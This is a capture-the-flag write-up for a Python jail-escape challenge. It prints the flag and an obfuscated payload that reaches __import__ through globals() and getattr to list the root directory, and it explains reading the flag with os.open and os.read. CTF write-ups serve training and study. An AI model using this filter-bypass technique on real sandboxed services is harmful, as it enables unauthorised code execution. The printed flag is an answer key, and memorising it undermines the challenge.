# Capital Jail hard

--------------------

### Description

**Difficulty:** hard

This jail seems to be far more advanced! Can you escape now?

```
nc some.server 1339
```

**Flag:** shadowctf{5c446e9e48716d0b2a93e6de38a0de13}

--------------------

### Solution

To list a directory and get a name of flag file, we use the following `ls` payload: 
``` python
(getattr(*([[x[len([[]])]for (x)in(globals().items())if 'builtin'in (x[len([])])][len([])]]+[[(y)for (y)in(dir([x[len([[]])]for (x)in(globals().items())if 'builtin'in (x[len([])])][len([])]))if 'import'in (y)][len([])]]))("os").listdir("/"))
```

Then see `payload`. Basically, it's just importing `os`, opening file with `os.open` and reading with `os.read`. 
`os.system` was banned in this task, as well as `os.popen` and some other classical vectors.

--------------------

### Running

`docker-compose up`
